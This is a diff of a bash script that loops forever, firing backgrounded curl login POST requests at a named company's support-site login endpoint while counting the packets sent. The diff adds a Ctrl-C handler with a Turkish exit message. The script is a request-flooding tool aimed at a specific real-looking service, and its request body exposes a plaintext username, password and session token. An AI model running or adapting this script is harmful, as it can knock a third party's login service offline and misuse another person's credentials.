@@ -1,5 +1,13 @@
 #!/bin/bash
 i=0
+
+trap ctrl_c INT
+
+ctrl_c() {
+    echo "Program kapatıldı."
+    exit 0
+}
+
 while true
 do
     curl 'https://btdestek.miateknoloji.com/app/Controller/Login?action=login' \
@@ -13,6 +21,7 @@ do
     -H 'sec-ch-ua-platform: "Linux"' \
     --data-raw '_token=83160e879436ea15b0669c14b163ba96&kullaniciAdi=omer.evren&parola=77Mtq-krpdw&hatirla=1' \
     --compressed &
+    
     echo "Paket $i:"
     i=$((i+1))
 done
